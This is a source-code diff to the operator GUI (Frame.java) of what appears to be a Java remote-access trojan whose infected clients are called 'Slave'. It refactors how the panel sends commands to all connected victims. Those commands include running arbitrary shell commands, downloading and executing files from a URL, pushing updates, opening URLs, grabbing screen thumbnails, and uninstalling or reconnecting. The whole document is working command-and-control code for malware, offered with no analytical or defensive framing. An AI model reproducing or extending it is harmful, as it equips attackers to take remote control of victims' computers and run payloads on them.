@@ -52,13 +52,16 @@ import com.redpois0n.Slave;
 import com.redpois0n.common.Version;
 import com.redpois0n.events.Event;
 import com.redpois0n.events.Events;
-import com.redpois0n.exceptions.CloseException;
 import com.redpois0n.listeners.CountryMenuItemListener;
 import com.redpois0n.net.URLParser;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
 import com.redpois0n.packets.outgoing.Packet11Disconnect;
+import com.redpois0n.packets.outgoing.Packet14VisitURL;
+import com.redpois0n.packets.outgoing.Packet17DownloadExecute;
+import com.redpois0n.packets.outgoing.Packet18Update;
+import com.redpois0n.packets.outgoing.Packet36Uninstall;
 import com.redpois0n.packets.outgoing.Packet37RestartJavaProcess;
+import com.redpois0n.packets.outgoing.Packet38RunCommand;
+import com.redpois0n.packets.outgoing.Packet40Thumbnail;
 import com.redpois0n.packets.outgoing.Packet45Reconnect;
 import com.redpois0n.plugins.Plugin;
 import com.redpois0n.plugins.PluginLoader;
@@ -567,8 +570,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm uninstalling all servers")) {
 						for (Slave sl : list) {
 							try {
-								sl.addToSendQueue(OutgoingHeader.UNINSTALL);
-								sl.closeSocket(new CloseException("Uninstalling"));
+								sl.addToSendQueue(new Packet36Uninstall());
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -596,12 +598,14 @@ public class Frame extends BaseFrame {
 					return;
 				}
 
+				result = result.trim().replace(" ", "%20");
+				
 				int servers = 0;
 				for (int i = 0; i < mainModel.getRowCount(); i++) {
 					Slave sl = Util.getSlave(mainModel.getValueAt(i, 3).toString());
 					if (sl != null) {
 						if (!sl.getVersion().equals(Version.getVersion())) {
-							sl.addToSendQueue(new PacketBuilder(OutgoingHeader.UPDATE, new String[] { result.trim().replace(" ", "%20") }));
+							sl.addToSendQueue(new Packet18Update(result));
 							++servers;
 						}
 					}
@@ -646,7 +650,7 @@ public class Frame extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				for (int i = 0; i < Main.connections.size(); i++) {
 					Slave sl = Main.connections.get(i);
-					sl.addToSendQueue(OutgoingHeader.THUMBNAIL);
+					sl.addToSendQueue(new Packet40Thumbnail());
 				}
 			}
 		});
@@ -865,9 +869,11 @@ public class Frame extends BaseFrame {
 						JOptionPane.showMessageDialog(null, "Input valid URL!", "Visit URL", JOptionPane.ERROR_MESSAGE);
 						return;
 					}
+					
+					result = result.trim();
 
 					for (Slave slave : servers) {
-						slave.addToSendQueue(new PacketBuilder(OutgoingHeader.VISIT_URL, new String[] { result.trim() }));
+						slave.addToSendQueue(new Packet14VisitURL(result));
 					}
 				}
 
@@ -976,13 +982,13 @@ public class Frame extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
-					String process = Util.showDialog("Run Command", "Select command to send to slave");
+					String process = Util.showDialog("Run Command", "Select command to send to servers");
 					if (process == null) {
 						return;
 					}
 
 					for (Slave slave : servers) {
-						slave.addToSendQueue(new PacketBuilder(OutgoingHeader.RUN_COMMAND, new String[] { process }));
+						slave.addToSendQueue(new Packet38RunCommand(process));
 					}
 				}
 			}
@@ -1006,8 +1012,11 @@ public class Frame extends BaseFrame {
 						JOptionPane.showMessageDialog(null, "Input valid URL!", "Update from URL", JOptionPane.ERROR_MESSAGE);
 						return;
 					}	
+					
+					result = result.trim().replace(" ", "%20");
+					
 					for (Slave sl : servers) {
-						sl.addToSendQueue(new PacketBuilder(OutgoingHeader.UPDATE, new String[] { result.trim().replace(" ", "%20") }));
+						sl.addToSendQueue(new Packet18Update(result));
 					}
 				}
 			}
@@ -1032,8 +1041,10 @@ public class Frame extends BaseFrame {
 						return;
 					}			
 
+					result = result.trim().replace(" ", "%20");
+					
 					for (Slave slave : servers) {
-						slave.addToSendQueue(new PacketBuilder(OutgoingHeader.DOWNLOAD_URL, new String[] { result.trim().replace(" ", "%20") }));
+						slave.addToSendQueue(new Packet17DownloadExecute(result));
 					}
 				}
 			}
@@ -1296,8 +1307,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
-								sl.addToSendQueue(new PacketBuilder(OutgoingHeader.DISCONNECT));
-								sl.closeSocket(new CloseException("Disconnecting"));
+								sl.addToSendQueue(new Packet11Disconnect());
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -1315,8 +1325,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm restarting " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
-								sl.addToSendQueue(OutgoingHeader.RESTART_JVM);
-								sl.closeSocket(new CloseException("Restarting connection"));
+								sl.addToSendQueue(new Packet37RestartJavaProcess());
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -1350,8 +1359,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm reconnect " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
-								sl.addToSendQueue(OutgoingHeader.RECONNECT);
-								sl.closeSocket(new CloseException("Reconnecting"));
+								sl.addToSendQueue(new Packet45Reconnect());
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -1373,8 +1381,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
-								sl.addToSendQueue(OutgoingHeader.UNINSTALL);
-								sl.closeSocket(new CloseException("Uninstalling"));
+								sl.addToSendQueue(new Packet36Uninstall());
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
